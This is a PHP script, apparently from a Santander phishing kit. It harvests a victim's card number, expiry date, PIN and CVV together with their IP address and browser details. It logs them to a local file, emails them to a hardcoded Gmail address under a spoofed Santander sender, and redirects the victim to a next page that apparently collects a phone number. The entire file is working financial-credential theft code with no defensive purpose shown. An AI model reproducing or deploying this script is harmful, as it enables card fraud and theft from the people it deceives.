<?php




$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser); 

$msg.="==================================================\r\n";
$msg=" [+] CREDITCARD(SANT-ANDER) ///EIkCHI\r\n";
$msg.="==============================\r\n";
$msg.="[+] CREDITCARD : {$_POST['CardNumber']}\r\n";
$msg.="[+] CREDITEXPY : {$_POST['ExpirationDate']}\r\n";
$msg.="[+] CREDIT ATM : Ahowaaaaaa lPIN: {$_POST['PIN']}\r\n";
$msg.="[+] CREDIT CCv : {$_POST['CCV']}\r\n";
$msg.="==============================\r\n";
$msg.="[+] localIP : {$_SERVER['REMOTE_ADDR']}\r\n";
$msg.="[+] BROWSER : {$_SESSION['browser']} On/ {$_SESSION['os']}\r\n";
$msg.="\r\n";
$msg.="\r\n";
$save=fopen("../groupe.txt","a+");fwrite($save,$msg);fclose($save);
$email="cocco.clement15@gmail.com"; //HERE
$subject="CREDITCARD(SANT-ANDER) =?utf-8?Q?=F0=9F=94=A5?= ({$_SERVER['REMOTE_ADDR']})";
$headers="From: EIkCHI™<SANTANDERBANk@moneySquad.org>\r\n";
$headers.="MIME-Version: 1.0\r\n";
$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
@mail($email,$subject,$msg,$headers);

header("Location: ../../Phone_Number.php"); 

?>